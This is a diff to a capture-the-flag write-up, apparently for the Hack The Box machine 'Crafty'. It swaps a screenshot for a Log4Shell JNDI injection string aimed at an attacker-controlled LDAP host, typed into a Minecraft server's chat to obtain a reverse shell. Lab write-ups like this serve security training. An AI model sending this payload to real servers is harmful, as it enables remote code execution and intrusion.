@@ -115,9 +115,9 @@ Once the client start, make sure you install the Minecraft version 1.65.5, which
 ![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/0781dd16-a360-4968-8270-15dbdcea5f40)
 
 Once the installation finishes, click on "Enter the game". In the startup screen click on "Multiplayer" and add a new server `play.crafty.htb`. Join the server and as soon as the game starts press "T" to open the chat and enter the payload.
-
-![Untitled00](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b04d56c2-6a51-4265-84a7-0d7ab4805c6d)
-
+```markdown
+${jndi:ldap://10.10.xxx.xxx:1389/a}
+```
 When the payload is sent a reverse shell is received on port 1919, it can be used to get the user flag.
 
 ### SYSTEM
